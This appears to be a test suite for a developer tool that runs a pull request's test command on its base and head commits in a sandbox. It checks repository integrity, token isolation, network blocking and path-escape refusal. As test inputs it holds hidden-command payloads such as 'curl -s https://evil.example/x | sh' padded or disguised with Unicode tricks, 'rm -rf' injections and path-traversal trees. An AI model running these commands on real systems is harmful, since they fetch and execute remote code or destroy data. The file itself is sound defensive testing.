/*
 * "Check on base" on a repository made for the test: a tiny python/unittest
 * project (an invented "orbit" calculator) with one commit where its test passes
 * and one where it fails, and a test that passes every second run.
 *
 * What is pinned, besides the counts: that the person's repository is the same
 * byte for byte afterwards (the hard rule of the feature), that every temp
 * directory is gone, and that a command which could not run is never counted as
 * a pass or a failure.
 */
import { afterAll, describe, expect, test } from "bun:test";
import { createHash } from "node:crypto";
import { mkdtempSync, readdirSync, readFileSync, rmSync, statSync, symlinkSync, writeFileSync } from "node:fs";
import { homedir, tmpdir } from "node:os";
import { join } from "node:path";
import { classifyRun, commandProblem, factsLine, planBlock, suggestCommand, tally, type RunRecord } from "../../shared/checkOnBase.ts";
import { checkBoxArgv, commitIsLocal, runCheckOnBase, sandboxKind } from "../src/checkOnBase.ts";
import { BLOB_CAP, ensureParent, MAX_ENTRIES, unsafePath } from "../src/treeExport.ts";

/** What this machine can do: the box where bwrap works, else the explicit no-box mode. */
const SB = sandboxKind();
const made: string[] = [];
const savedToken = { gh: process.env.GITHUB_TOKEN, gl: process.env.AGENTGLASS_TOKEN };
afterAll(() => {
  for (const d of made) rmSync(d, { recursive: true, force: true });
  for (const [k, v] of [["GITHUB_TOKEN", savedToken.gh], ["AGENTGLASS_TOKEN", savedToken.gl]] as const) {
    if (v === undefined) delete process.env[k]; else process.env[k] = v;
  }
});

function git(root: string, ...args: string[]): string {
  const r = Bun.spawnSync(["git", "-C", root, "-c", "user.name=Orbit Test", "-c", "user.email=test@orbit.invalid", ...args], { env: { PATH: process.env.PATH ?? "", HOME: root, GIT_CONFIG_NOSYSTEM: "1" } });
  if (!r.success) throw new Error(`git ${args.join(" ")}: ${r.stderr.toString()}`);
  return r.stdout.toString().trim();
}

/** Two commits in a throwaway repository: `files(0)` is the base, `files(1)` the head. */
function fixture(files: (n: 0 | 1) => Record<string, string>): { root: string; base: string; head: string } {
  const root = mkdtempSync(join(tmpdir(), "agx-fixture-"));
  made.push(root);
  git(root, "init", "-q", "-b", "main");
  const commit = (n: 0 | 1) => {
    for (const [name, body] of Object.entries(files(n))) writeFileSync(join(root, name), body);
    git(root, "add", "-A");
    git(root, "commit", "-q", "-m", `step ${n}`);
    return git(root, "rev-parse", "HEAD");
  };
  const base = commit(0);
  const head = commit(1);
  return { root, base, head };
}

const calc = (op: string) => `def add(a, b):\n    return a ${op} b\n`;
const TEST_CALC = "import unittest\nfrom calc import add\n\nclass T(unittest.TestCase):\n    def test_add(self):\n        self.assertEqual(add(2, 3), 5)\n\nif __name__ == '__main__':\n    unittest.main()\n";
const UNITTEST = "python3 -m unittest -q test_calc";

/** Every file under `.git` by content, plus what `git status` and the refs say. */
function snapshot(root: string, withStatus = true): string {
  const h = createHash("sha256");
  const walk = (d: string) => {
    for (const n of readdirSync(d).sort()) {
      const p = join(d, n);
      const s = statSync(p);
      if (s.isDirectory()) walk(p);
      else { h.update(p); h.update(readFileSync(p)); h.update(String(s.mtimeMs)); }
    }
  };
  walk(join(root, ".git"));
  if (!withStatus) return h.digest("hex");
  const env = { PATH: process.env.PATH ?? "", GIT_OPTIONAL_LOCKS: "0" };
  for (const args of [["status", "--porcelain=v2", "--branch"], ["for-each-ref"], ["worktree", "list"], ["stash", "list"], ["config", "--local", "--list"]]) {
    h.update(Bun.spawnSync(["git", "-C", root, ...args], { env }).stdout.toString());
  }
  return h.digest("hex");
}

const leftovers = () => readdirSync(tmpdir()).filter((n) => n.startsWith("agx-check-")).sort();

describe("the experiment", () => {
  test("a test that passes on base and fails on head reads as exactly that", async () => {
    const f = fixture((n) => ({ "calc.py": calc(n === 0 ? "+" : "-"), "test_calc.py": TEST_CALC }));
    const r = await runCheckOnBase({ sandbox: SB, gitRoot: f.root, baseSha: f.base, headSha: f.head, command: UNITTEST });
    expect(r.ok).toBe(true);
    if (!r.ok) return;
    expect(r.facts).toBe("passed 3/3 on base, failed 3/3 on head");
    expect(r.base.every((x) => x.outcome === "pass")).toBe(true);
    expect(r.head.every((x) => x.outcome === "fail")).toBe(true);
  }, 60_000);

  test("a test that fails on base too says so, with the count", async () => {
    const f = fixture((n) => ({ "calc.py": calc("-"), "test_calc.py": TEST_CALC, "note.txt": String(n) }));
    const r = await runCheckOnBase({ sandbox: SB, gitRoot: f.root, baseSha: f.base, headSha: f.head, command: UNITTEST });
    expect(r.ok && r.facts).toBe("failed 3/3 on head; failed on base too (3/3)");
  }, 60_000);

  test("a flaky test is counted run by run, never as a verdict", async () => {
    // The counter lives in the exported tree, which one side reuses for its three runs: fail, pass, fail.
    const flaky = "import os, unittest\n\nclass T(unittest.TestCase):\n    def test_every_other_run(self):\n        n = int(open('.count').read()) if os.path.exists('.count') else 0\n        open('.count', 'w').write(str(n + 1))\n        self.assertEqual(n % 2, 1)\n";
    const f = fixture((n) => ({ "test_flaky.py": flaky, "note.txt": String(n) }));
    const r = await runCheckOnBase({ sandbox: SB, gitRoot: f.root, baseSha: f.base, headSha: f.head, command: "python3 -m unittest -q test_flaky" });
    expect(r.ok && r.facts).toBe("passed 1/3, failed 2/3 on head; failed on base too (2/3)");
    if (r.ok) expect(r.base.map((x) => x.outcome)).toEqual(["fail", "pass", "fail"]);
  }, 60_000);

  test("a missing tool is 'could not run', in no way a pass or a failure", async () => {
    const f = fixture((n) => ({ "note.txt": String(n) }));
    const r = await runCheckOnBase({ sandbox: SB, gitRoot: f.root, baseSha: f.base, headSha: f.head, command: "orbit-no-such-tool --run" });
    expect(r.ok).toBe(true);
    if (!r.ok) return;
    expect(r.facts).toMatch(/^could not run here \(.*not found/);
    expect([...r.base, ...r.head].every((x) => x.outcome === "unrunnable")).toBe(true);
  }, 60_000);

  test("a missing python module is also 'could not run'", async () => {
    const f = fixture((n) => ({ "note.txt": String(n) }));
    const r = await runCheckOnBase({ sandbox: SB, gitRoot: f.root, baseSha: f.base, headSha: f.head, command: "python3 -c 'import orbit_missing_dep'" });
    expect(r.ok && r.facts).toMatch(/^could not run here \(.*(ModuleNotFoundError|No module named)/);
  }, 60_000);

  test("a run over its timeout is stopped and read as 'could not run'", async () => {
    const f = fixture((n) => ({ "note.txt": String(n) }));
    const t0 = Date.now();
    const r = await runCheckOnBase({ sandbox: SB, gitRoot: f.root, baseSha: f.base, headSha: f.head, command: "sleep 30", runs: 1, timeoutS: 1 });
    expect(r.ok && r.facts).toBe("could not run here (timed out after 1s)");
    expect(Date.now() - t0).toBeLessThan(15_000);
  }, 60_000);

  test("a commit that is not local stops the run: nothing is fetched, nothing is made", async () => {
    const f = fixture((n) => ({ "note.txt": String(n) }));
    const before = leftovers();
    const r = await runCheckOnBase({ sandbox: SB, gitRoot: f.root, baseSha: "0".repeat(40), headSha: f.head, command: "true" });
    expect(r).toEqual({ ok: false, error: "the base commit is not local" });
    expect(await commitIsLocal(f.root, f.head)).toBe(true);
    expect(await commitIsLocal(f.root, "not-a-sha; rm -rf /")).toBe(false);
    expect(leftovers()).toEqual(before);
  });

  test("the repository is byte-identical afterwards, and every temp directory is gone", async () => {
    const f = fixture((n) => ({ "calc.py": calc(n === 0 ? "+" : "-"), "test_calc.py": TEST_CALC }));
    writeFileSync(join(f.root, "scratch.txt"), "untracked and staged-free\n");
    const before = { snap: snapshot(f.root), dirs: leftovers() };
    const r = await runCheckOnBase({ sandbox: SB, gitRoot: f.root, baseSha: f.base, headSha: f.head, command: UNITTEST });
    expect(r.ok).toBe(true);
    expect(snapshot(f.root)).toBe(before.snap);
    expect(leftovers()).toEqual(before.dirs);
    expect(readFileSync(join(f.root, "scratch.txt"), "utf8")).toBe("untracked and staged-free\n");
  }, 60_000);

  test("no token reaches the command", async () => {
    process.env.GITHUB_TOKEN = "orbit-test-token";
    process.env.AGENTGLASS_TOKEN = "orbit-test-token";
    const f = fixture((n) => ({ "note.txt": String(n) }));
    const r = await runCheckOnBase({ sandbox: SB, gitRoot: f.root, baseSha: f.base, headSha: f.head, command: 'test -z "$GITHUB_TOKEN" && test -z "$AGENTGLASS_TOKEN" && ! env | grep -qi orbit-test-token' });
    expect(r.ok && r.facts).toBe("passed 3/3 on base, passed 3/3 on head");
  }, 60_000);

  test("the command runs in the export, not in the person's checkout", async () => {
    const f = fixture((n) => ({ "note.txt": String(n) }));
    const r = await runCheckOnBase({ sandbox: SB, gitRoot: f.root, baseSha: f.base, headSha: f.head, command: `test "$(cat note.txt)" = 0`, runs: 1 });
    // base holds note.txt = 0, head = 1: the command saw each commit's own tree.
    expect(r.ok && r.facts).toBe("passed 1/1 on base, failed 1/1 on head");
  }, 60_000);

  test("progress counts every run and a cancel stops the rest", async () => {
    const f = fixture((n) => ({ "note.txt": String(n) }));
    const seen: number[] = [];
    const ac = new AbortController();
    const r = await runCheckOnBase({ sandbox: SB, gitRoot: f.root, baseSha: f.base, headSha: f.head, command: "true", signal: ac.signal, onProgress: (d, t) => { seen.push(d); expect(t).toBe(6); if (d === 1) ac.abort(); } });
    expect(r.ok && r.cancelled).toBe(true);
    expect(seen[0]).toBe(0);
    expect(Math.max(...seen)).toBeLessThan(6);
  }, 60_000);
});

/** A repository of two commits whose tree is built by hand, so it can hold what `git add` refuses. */
function craftedRepo(build: (root: string, blob: (data: string | Buffer) => string, tree: (...e: [string, string, string][]) => string) => string): { root: string; base: string; head: string } {
  const root = mkdtempSync(join(tmpdir(), "agx-fixture-"));
  made.push(root);
  git(root, "init", "-q", "-b", "main");
  const hash = (type: string, data: Buffer) => {
    const r = Bun.spawnSync(["git", "-C", root, "hash-object", "-w", "--literally", "-t", type, "--stdin"], { stdin: data, env: { PATH: process.env.PATH ?? "", HOME: root } });
    return r.stdout.toString().trim();
  };
  const blob = (data: string | Buffer) => hash("blob", Buffer.from(data));
  const tree = (...e: [string, string, string][]) => hash("tree", Buffer.concat(e.map(([m, n, o]) => Buffer.concat([Buffer.from(`${m} ${n}\0`), Buffer.from(o, "hex")]))));
  const top = build(root, blob, tree);
  const base = git(root, "commit-tree", top, "-m", "base");
  const head = git(root, "commit-tree", top, "-p", base, "-m", "head");
  return { root, base, head };
}

describe("what the export may do", () => {
  test("a repository's own filters never run, and what the commit marks export-ignore is still there", async () => {
    const marks = mkdtempSync(join(tmpdir(), "agx-marks-"));
    made.push(marks);
    const f = fixture((n) => ({ ".gitattributes": "* filter=orbit\nspec.txt export-ignore\n", "spec.txt": "the test\n", "note.txt": String(n) }));
    // Configured AFTER the commits, like any checkout's own .git/config: smudge, clean and the long-running process form.
    for (const [k, v] of [["smudge", `touch ${marks}/smudge; cat`], ["clean", `touch ${marks}/clean; cat`], ["process", `touch ${marks}/process; exit 1`]]) git(f.root, "config", `filter.orbit.${k}`, v);
    // Not `git status` here: with a clean filter configured, status itself runs it.
    const before = snapshot(f.root, false);
    const r = await runCheckOnBase({ sandbox: SB, gitRoot: f.root, baseSha: f.base, headSha: f.head, command: "test -f spec.txt && test -f .gitattributes", runs: 1 });
    expect(r.ok && r.facts).toBe("passed 1/1 on base, passed 1/1 on head");
    expect(readdirSync(marks)).toEqual([]);
    expect(snapshot(f.root, false)).toBe(before);
  }, 60_000);

  const outsideDir = () => { const d = mkdtempSync(join(tmpdir(), "agx-outside-")); made.push(d); return d; };
  const exportOf = (f: { root: string; base: string; head: string }) => runCheckOnBase({ sandbox: "none", gitRoot: f.root, baseSha: f.base, headSha: f.head, command: "true", runs: 1 });

  test("a path that would leave the export is dropped, and the rest of the commit still runs", async () => {
    const f = craftedRepo((_r, blob, tree) => {
      const sub = tree(["100644", "escape.txt", blob("pwned")]);
      return tree(["100644", "ok.txt", blob("fine")], ["40000", "..", sub], ["40000", ".git", sub]);
    });
    const r = await runCheckOnBase({ sandbox: "none", gitRoot: f.root, baseSha: f.base, headSha: f.head, command: "test -f ok.txt && test ! -e ../escape.txt && test ! -e .git", runs: 1 });
    expect(r.ok && r.facts).toBe("passed 1/1 on base, passed 1/1 on head");
  }, 60_000);

  test("a symlink and then an entry under it is refused whole, and nothing is made outside", async () => {
    const outside = outsideDir();
    const f = craftedRepo((_r, blob, tree) => tree(["120000", "a", blob(outside)], ["40000", "a", tree(["120000", "b", blob("/etc")])]));
    expect(await exportOf(f)).toEqual({ ok: false, error: "could not export the base commit: the commit holds an entry under another entry" });
    expect(readdirSync(outside)).toEqual([]);
  }, 60_000);

  test("the same on a filesystem that folds case: symlink A and an entry a/b", async () => {
    const outside = outsideDir();
    const f = craftedRepo((_r, blob, tree) => tree(["120000", "A", blob(outside)], ["40000", "a", tree(["100644", "b", blob("pwned")])]));
    expect(await exportOf(f)).toMatchObject({ ok: false, error: expect.stringContaining("entry under another entry") });
    expect(readdirSync(outside)).toEqual([]);
  }, 60_000);

  test("a path listed twice, and a file with an entry under it, are refused", async () => {
    const dup = craftedRepo((_r, blob, tree) => tree(["100644", "x", blob("1")], ["100644", "x", blob("2")]));
    expect(await exportOf(dup)).toMatchObject({ ok: false, error: expect.stringContaining("one path twice") });
    const under = craftedRepo((_r, blob, tree) => tree(["100644", "f", blob("1")], ["40000", "f", tree(["100644", "g", blob("2")])]));
    expect(await exportOf(under)).toMatchObject({ ok: false, error: expect.stringContaining("under another entry") });
  }, 60_000);

  test("ensureParent walks one component at a time and refuses a symlink or a file in the way", () => {
    const outside = outsideDir();
    const dir = mkdtempSync(join(tmpdir(), "agx-fixture-"));
    made.push(dir);
    symlinkSync(outside, join(dir, "s"));
    writeFileSync(join(dir, "plain"), "x");
    expect(() => ensureParent(dir, "s/x/y")).toThrow();
    expect(() => ensureParent(dir, "plain/y")).toThrow();
    ensureParent(dir, "d1/d2/leaf");
    expect(statSync(join(dir, "d1/d2")).isDirectory()).toBe(true);
    expect(readdirSync(outside)).toEqual([]);
  });

  test("a commit over the entry cap, or with one file over the file cap, is refused before anything is written", async () => {
    const many = craftedRepo((_r, blob, tree) => { const o = blob("x"); return tree(...Array.from({ length: MAX_ENTRIES + 1 }, (_, i): [string, string, string] => ["100644", `f${i}`, o])); });
    expect(await exportOf(many)).toMatchObject({ ok: false, error: expect.stringContaining(`more than ${MAX_ENTRIES} files`) });
    const big = craftedRepo((_r, blob, tree) => tree(["100644", "big.bin", blob(Buffer.alloc(BLOB_CAP + 1))]));
    expect(await exportOf(big)).toMatchObject({ ok: false, error: expect.stringContaining("over 64 MB") });
  }, 120_000);

  test("a large file is streamed to disk, not joined in memory", async () => {
    const size = 48 * 1024 * 1024;
    const f = craftedRepo((_r, blob, tree) => tree(["100644", "data.bin", blob(Buffer.alloc(size, 7))]));
    const t0 = Date.now();
    const r = await runCheckOnBase({ sandbox: "none", gitRoot: f.root, baseSha: f.base, headSha: f.head, command: `test "$(stat -c %s data.bin)" = ${size}`, runs: 1 });
    expect(r.ok && r.facts).toBe("passed 1/1 on base, passed 1/1 on head");
    expect(Date.now() - t0).toBeLessThan(8000);
  }, 120_000);

  test("unsafePath refuses empty, dot, dot-dot, .git in any case, absolute and NUL", () => {
    for (const p of ["", ".", "a/../b", "../x", "/etc/passwd", ".git/config", "sub/.GIT/hooks/x", "a//b", "a\0b"]) expect(unsafePath(p)).toBe(true);
    for (const p of ["a.txt", "dir/sub/file.py", ".github/workflows/ci.yml", ".gitattributes", "x.git/y"]) expect(unsafePath(p)).toBe(false);
  });

  test("an executable file stays executable and a submodule is an empty directory", async () => {
    const f = craftedRepo((_r, blob, tree) => tree(["100755", "run.sh", blob("#!/bin/sh\nexit 0\n")], ["160000", "vendor", "1".repeat(40)]));
    const r = await runCheckOnBase({ sandbox: SB, gitRoot: f.root, baseSha: f.base, headSha: f.head, command: "./run.sh && test -d vendor && test -z \"$(ls -A vendor)\"", runs: 1 });
    expect(r.ok && r.facts).toBe("passed 1/1 on base, passed 1/1 on head");
  }, 60_000);
});

describe("what a command cannot do to the run", () => {
  test("a daemonised child holding the pipe does not hold the run", async () => {
    const f = fixture((n) => ({ "note.txt": String(n) }));
    const t0 = Date.now();
    const r = await runCheckOnBase({ sandbox: "none", gitRoot: f.root, baseSha: f.base, headSha: f.head, command: "setsid sleep 6 & echo started", runs: 1 });
    expect(r.ok && r.facts).toBe("passed 1/1 on base, passed 1/1 on head");
    expect(Date.now() - t0).toBeLessThan(5000);
  }, 60_000);

  test("on a timeout a daemonised child does not hold it either", async () => {
    const f = fixture((n) => ({ "note.txt": String(n) }));
    const t0 = Date.now();
    const r = await runCheckOnBase({ sandbox: "none", gitRoot: f.root, baseSha: f.base, headSha: f.head, command: "setsid sleep 6 & sleep 30", runs: 1, timeoutS: 1 });
    expect(r.ok && r.facts).toBe("could not run here (timed out after 1s)");
    expect(Date.now() - t0).toBeLessThan(5000);
  }, 60_000);

  test("a tree the command made unreadable is still removed, and the result is kept", async () => {
    const f = fixture((n) => ({ "note.txt": String(n) }));
    const before = leftovers();
    const r = await runCheckOnBase({ sandbox: SB, gitRoot: f.root, baseSha: f.base, headSha: f.head, command: "mkdir d && touch d/f && chmod 000 d", runs: 1 });
    expect(r.ok && r.facts).toBe("passed 1/1 on base, passed 1/1 on head");
    expect(leftovers()).toEqual(before);
  }, 60_000);

  test("base and head each get a home of their own", async () => {
    const f = fixture((n) => ({ "note.txt": String(n) }));
    const r = await runCheckOnBase({ sandbox: "none", gitRoot: f.root, baseSha: f.base, headSha: f.head, command: 'touch "$HOME/$(basename "$PWD")"; sleep 0.4; test "$(ls "$HOME" | wc -l)" = 1 && test "$TMPDIR" = "$HOME"', runs: 1 });
    expect(r.ok && r.facts).toBe("passed 1/1 on base, passed 1/1 on head");
  }, 60_000);
});

describe.skipIf(sandboxKind() !== "bwrap")("in the box", () => {
  test("the person's home is not visible", async () => {
    const f = fixture((n) => ({ "note.txt": String(n) }));
    const r = await runCheckOnBase({ sandbox: SB, gitRoot: f.root, baseSha: f.base, headSha: f.head, command: `test ! -e ${JSON.stringify(homedir())}`, runs: 1 });
    expect(r.ok && r.sandbox).toBe("bwrap");
    expect(r.ok && r.facts).toBe("passed 1/1 on base, passed 1/1 on head");
  }, 60_000);

  test("there is no network", async () => {
    const f = fixture((n) => ({ "note.txt": String(n) }));
    const r = await runCheckOnBase({ sandbox: SB, gitRoot: f.root, baseSha: f.base, headSha: f.head, command: `python3 -c "import socket; socket.create_connection(('127.0.0.1', 9), 1)"`, runs: 1 });
    // The point is that it cannot connect out; the exact words differ by host, and it never reads as a pass.
    expect(r.ok && [...r.base, ...r.head].every((x) => x.outcome !== "pass")).toBe(true);
  }, 60_000);
});

describe("the box's argv", () => {
  const argv = checkBoxArgv({ bwrap: "/usr/bin/bwrap", tree: "/tmp/agx-check-x/base", command: "make test", hostPath: "/usr/bin:/home/orbit/.bun/bin", home: "/home/orbit", programDirs: ["/home/orbit/.bun/bin"], systemDirs: ["/etc"], systemLinks: [{ path: "/bin", target: "usr/bin" }] });
  test("shares nothing and drops every capability", () => {
    expect(argv).toContain("--unshare-all");
    expect(argv).not.toContain("--share-net");
    expect(argv.join(" ")).toContain("--cap-drop ALL");
    expect(argv).toContain("--die-with-parent");
  });
  test("the export is the one writable path, at a fixed place", () => {
    expect(argv.join(" ")).toContain("--bind /tmp/agx-check-x/base /work --chdir /work bash -c make test");
    expect(argv.filter((a) => a === "--bind")).toHaveLength(1);
  });
  test("home is a fresh tmpfs and the host's home entries leave the PATH, but a program dir comes back", () => {
    const pathVal = argv[argv.indexOf("PATH") + 1]!;
    expect(pathVal).toBe("/usr/bin:/home/orbit/.bun/bin");
    expect(argv.join(" ")).toContain("--tmpfs /home/box");
    expect(argv.join(" ")).toContain("--ro-bind /home/orbit/.bun/bin /home/orbit/.bun/bin");
  });
});

describe("the routes", () => {
  const index = readFileSync(new URL("../src/index.ts", import.meta.url), "utf8");
  test("starting a run is a POST from the desktop shell alone, stopping one from a trusted caller; the plan and the status only read", () => {
    // Starting runs a command on a pull request's head, the class of route that is desktopOnly.
    const start = index.indexOf('pathname === "/prs/check-on-base" && req.method === "POST"');
    expect(start).toBeGreaterThan(-1);
    const gate = index.slice(start, index.indexOf("let b:", start));
    expect(gate).toContain("desktopOnly(req)");
    expect(gate).not.toContain("trustedCaller(req, from)");
    const cancel = index.indexOf('pathname === "/prs/check-on-base/cancel" && req.method === "POST"');
    expect(cancel).toBeGreaterThan(-1);
    expect(index.slice(cancel, cancel + 160)).toContain("trustedCaller(req, from)");
    // Starting one is an auditable action, like starting an agent from here.
    const at = index.indexOf('pathname === "/prs/check-on-base" && req.method === "POST"');
    expect(index.slice(at, at + 1400)).toContain('noteAction(clientIp, "/prs/check-on-base"');
    const startCalls = index.match(/startCheckOnBase\(/g) ?? [];
    expect(startCalls).toHaveLength(1);
  });
});

describe("the words", () => {
  const rec = (outcome: RunRecord["outcome"], line?: string): RunRecord => ({ outcome, line });
  const three = (...o: RunRecord["outcome"][]) => tally(o.map((x) => rec(x, x === "unrunnable" ? "no docker" : undefined)));

  test("how a run ended becomes an outcome", () => {
    expect(classifyRun(0, "").outcome).toBe("pass");
    expect(classifyRun(1, "AssertionError: 5 != 6").outcome).toBe("fail");
    expect(classifyRun(1, "ModuleNotFoundError: No module named 'orbit'").outcome).toBe("unrunnable");
    expect(classifyRun(127, "").outcome).toBe("unrunnable");
    expect(classifyRun(1, "ok", 120)).toEqual({ outcome: "unrunnable", line: "timed out after 120s" });
  });

  test("counts, never a verdict word", () => {
    expect(factsLine(three("pass", "pass", "pass"), three("fail", "fail", "fail"))).toBe("passed 3/3 on base, failed 3/3 on head");
    expect(factsLine(three("fail", "fail", "fail"), three("fail", "fail", "fail"))).toBe("failed 3/3 on head; failed on base too (3/3)");
    expect(factsLine(three("pass", "pass", "pass"), three("pass", "fail", "fail"))).toBe("passed 3/3 on base, passed 1/3, failed 2/3 on head");
    expect(factsLine(three("unrunnable", "unrunnable", "unrunnable"), three("unrunnable", "unrunnable", "unrunnable"))).toBe("could not run here (no docker)");
    expect(factsLine(three("unrunnable", "unrunnable", "unrunnable"), three("pass", "pass", "fail"))).toBe("could not run on base (no docker); passed 2/3, failed 1/3 on head");
    expect(factsLine(three("pass", "pass", "unrunnable"), three("pass", "pass", "pass"))).toBe("passed 2/3, 1 could not run on base, passed 3/3 on head");
    for (const w of [/yours/i, /not your/i, /innocent/i, /guilty/i, /caused/i]) expect(factsLine(three("pass", "pass", "pass"), three("fail", "fail", "fail"))).not.toMatch(w);
  });

  test("the suggested command comes only from what the card knows", () => {
    expect(suggestCommand({ kind: "step", title: "pytest -c orbit/pytest.ini -q" })).toBe("pytest -c orbit/pytest.ini -q");
    expect(suggestCommand({ kind: "step", title: "Tests (server)" })).toBe("");
    expect(suggestCommand({ kind: "pytest", title: "tests/test_board.py::test_lanes" })).toBe("python3 -m pytest 'tests/test_board.py::test_lanes'");
    expect(suggestCommand({ kind: "pytest", title: "x'; rm -rf ~ #.py::t" })).toBe("");
    expect(suggestCommand({ kind: "bun", title: "orbit board > renders its lanes" })).toBe("");
  });

  test("a commit that is not here is said in words, base first", () => {
    const plan = { ok: true as const, base: { ref: "main", sha: "a".repeat(40), local: false }, head: { sha: "b".repeat(40), local: false }, sandbox: "bwrap" as const, runs: 3, timeoutS: 120 };
    expect(planBlock(plan)).toBe("the base commit is not local (aaaaaaa on main)");
    expect(planBlock({ ...plan, base: { ...plan.base, local: true } })).toBe("the head commit is not local (bbbbbbb)");
    expect(planBlock({ ...plan, base: { ...plan.base, local: true }, head: { ...plan.head, local: true } })).toBe("");
  });

  test("an empty, huge or NUL command is refused before anything runs", () => {
    expect(commandProblem("")).not.toBe("");
    expect(commandProblem("   ")).not.toBe("");
    expect(commandProblem("a".repeat(1001))).not.toBe("");
    expect(commandProblem("a\0b")).not.toBe("");
    expect(commandProblem("make test")).toBe("");
  });

  /*
   * A step name or an annotation title on a pull request from a fork is the
   * fork's text, and the box shows two rows. Each of these showed `npm test`
   * and ran something else.
   */
  const hidden = [
    "npm test" + " ".repeat(300) + "; curl -s https://evil.example/x | sh",
    "npm test\n\n\n; curl -s https://evil.example/x | sh",
    "npm test\r; touch /tmp/x",
    "npm test \u202e hs | x/elpmaxe.live//:sptth s- lruc ;",
    "npm test\u200b\u2066; touch /tmp/x\u2069",
    "npm test\t\t\t; touch /tmp/x",
  ];
  test("a suggestion from a step or annotation title is plain words or nothing", () => {
    for (const title of hidden) {
      expect(suggestCommand({ kind: "annotation", title }), JSON.stringify(title)).toBe("");
      expect(suggestCommand({ kind: "step", title }), JSON.stringify(title)).toBe("");
    }
    for (const title of ["npm test; curl x | sh", "make test && rm -rf ~", "npm test $(id)", "./run `id`", "npm test > /tmp/x"]) {
      expect(suggestCommand({ kind: "step", title }), title).toBe("");
    }
    expect(suggestCommand({ kind: "step", title: "npm test " + "a".repeat(200) })).toBe("");
    // A runner is a whole word: a tool whose name merely starts like one is not one.
    expect(suggestCommand({ kind: "step", title: "gopher-install now" })).toBe("");
    expect(suggestCommand({ kind: "step", title: "nodeevil x" })).toBe("");
    expect(suggestCommand({ kind: "step", title: "make" })).toBe("make");
    expect(suggestCommand({ kind: "step", title: "make test TEST=orbit/board_test.py" })).toBe("make test TEST=orbit/board_test.py");
    expect(suggestCommand({ kind: "annotation", title: "npm run test -- --runInBand" })).toBe("npm run test -- --runInBand");
  });
  test("a command that can hide part of itself in the box is refused, whoever wrote it", () => {
    for (const cmd of hidden) expect(commandProblem(cmd), JSON.stringify(cmd)).not.toBe("");
    expect(commandProblem("pytest -k 'board and not slow' -q")).toBe("");
  });
});
